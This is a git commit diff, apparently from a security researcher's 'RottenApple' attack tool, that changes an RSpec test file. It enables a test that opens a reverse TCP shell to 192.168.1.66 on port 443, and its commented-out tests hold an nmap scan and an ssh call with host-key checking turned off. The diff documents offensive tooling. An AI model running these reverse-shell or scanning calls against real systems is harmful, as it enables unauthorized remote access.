1d593b01a60de9d7e023325a0af9917f2c3e175a
Jonathan Claudius <jclaudius@trustwave.com>
2013-04-08 20:44:56 -0500

    Reverse Shell Test 1

--- spec/rotten_apple_spec.rb
+++ spec/rotten_apple_spec.rb
@@ -10,9 +10,9 @@ describe RottenApple::Attack do
     subject{@attack}
     its(:class) {should == RottenApple::Attack}
     
-    #it "should throw a reverse tcp shell" do
-    # subject.reverse_shell('10.225.71.7', 1337)
-    #end
+    it "should throw a reverse tcp shell" do
+     subject.reverse_shell('192.168.1.66', 443)
+    end
 
     #it "should perform an NMAP scan" do
     #  subject.command('nmap -p 80,443 --open -Pn -P0 -n -T4 10.255.71.0/24')
@@ -22,9 +22,9 @@ describe RottenApple::Attack do
     #  subject.command('ls ../../')
     #end
 
-    it "should allow me to authenticate to github" do
-      subject.command('ssh -o "StrictHostKeyChecking no" -o ConnectTimeout=10 -T git@github.com')
-    end
+    #it "should allow me to authenticate to github" do
+    #  subject.command('ssh -o "StrictHostKeyChecking no" -o ConnectTimeout=10 -T git@github.com')
+    #end
   end
 
 end
